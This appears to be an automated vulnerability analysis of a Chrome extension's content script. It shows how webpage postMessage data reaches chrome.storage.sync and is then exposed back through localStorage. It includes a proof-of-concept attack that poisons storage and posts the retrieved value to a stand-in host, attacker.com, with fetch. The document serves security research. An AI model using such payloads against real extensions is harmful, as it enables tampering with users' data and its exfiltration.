# CoCo Analysis: pmlkackfnbbnjfejpddpakallilkbdme

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: cs_window_eventListener_message → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pmlkackfnbbnjfejpddpakallilkbdme/opgen_generated_files/cs_0.js
Line 489: `let Update = ev => {`
Line 490: `let tsData = ev.data.tsData`
Line 490: `ev.data.tsData`

**Code:**

```javascript
// Content script initialization (cs_0.js lines 469-471, 483-487)
let self = chrome || browser
let file = self.runtime.getURL("turnStyles.js")
let sync = self.storage ? self.storage.sync : false

let Backup = () => {
	if (data) sync.set({ tsData: data })
	window.addEventListener("message", Update) // ← Registers message listener
	sync.get([ "tsData" ], db => Inject(db)) // ← Retrieves stored data
}

// Message handler (cs_0.js lines 489-492)
let Update = ev => {
	let tsData = ev.data.tsData // ← Attacker-controlled data from postMessage
	if (tsData) sync.set({ tsData }) // ← Storage write sink
}

// Inject function - retrieves and exposes stored data (cs_0.js lines 494-504)
let Inject = db => {
	let data = db ? db.tsData : "{}" // ← Data from storage
	let base = file.split("/turnStyles.js")[0]
	window.localStorage.setItem("tsBase", base)
	window.localStorage.setItem("tsSync", data) // ← Stored data exposed to webpage via localStorage

	let elem = document.createElement("script")
	elem.src = `${ file }?v=${ Math.random() }`
	elem.type = "text/javascript"
	document.body.append(elem)
}

// Initialization logic (cs_0.js lines 506-512)
(function () {
	if (document.querySelectorAll("#turntable").length) {
		if (wipe) Format()
		if (sync) Backup() // ← Calls Backup which sets up message listener and retrieval
		else return Inject()
	}
})()
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Window postMessage from webpage to content script

**Attack:**

```javascript
// From any webpage where content script is injected (matches: *://*/*):
// Step 1: Poison storage
window.postMessage({
	tsData: '{"malicious": "payload", "theme": "evil"}'
}, "*");

// Step 2: Storage is automatically retrieved and exposed via localStorage
// The Backup() function calls sync.get(["tsData"], db => Inject(db))
// Inject() then writes to window.localStorage.setItem("tsSync", data)

// Step 3: Attacker reads back the poisoned data
setTimeout(() => {
	const storedData = window.localStorage.getItem("tsSync");
	console.log("Retrieved poisoned data:", storedData);
	// Exfiltrate to attacker server
	fetch('https://attacker.com/log', {
		method: 'POST',
		body: storedData
	});
}, 1000);
```

**Impact:** Complete storage exploitation chain. The content script (injected on all URLs via matches: "*://*/*") listens for window.postMessage events and stores attacker-controlled data in chrome.storage.sync. The same script then retrieves this data via sync.get() and exposes it to the webpage through window.localStorage.setItem("tsSync", data). An attacker can poison storage and immediately retrieve the poisoned value, completing the exploitation chain. This allows arbitrary data injection into the extension's storage sync and subsequent retrieval/manipulation of extension settings.
